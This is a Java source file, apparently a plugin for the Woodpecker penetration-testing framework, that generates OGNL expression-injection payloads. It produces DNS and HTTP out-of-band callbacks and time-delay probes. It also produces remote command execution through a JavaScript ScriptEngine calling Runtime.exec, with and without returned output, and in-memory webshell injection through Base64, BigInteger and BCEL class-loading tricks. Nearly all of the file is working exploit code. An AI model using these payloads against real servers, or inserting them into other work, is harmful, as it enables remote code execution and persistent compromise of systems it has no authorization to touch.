package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;

import java.io.IOException;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class OGNLExpr implements IExpr {

    @Override
    public String getName() {
        return "OGNL";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                "@java.net.InetAddress@getByName('" + escape(domain) + "')"
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                "new java.net.URL('" + escape(url) + "').getContent()"
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                "@java.lang.Thread@sleep(" + (sec * 1000) + ")"
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\")')"
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')"
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + "')" + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + "')" + System.lineSeparator() + " <==",
                    "[+] BCEL方案：==>" + getBcelMemShell(memShellClass) + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常"
            };
        }
    }

    public String getBcelMemShell(byte[] memShellClass) throws IOException {
        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
        return "(new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance())";
    }
}
